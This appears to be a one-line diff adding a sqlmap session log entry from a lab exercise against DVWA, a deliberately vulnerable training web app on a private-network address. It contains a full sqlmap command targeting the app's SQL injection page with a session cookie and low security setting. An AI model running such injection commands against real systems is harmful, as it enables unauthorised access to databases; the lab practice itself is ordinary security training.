@@ -1,0 +1,1 @@
+http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=ee14a0fc65da267bc0c284af23452d03; security=low" --batch --banner -o sqlmap_output.txt
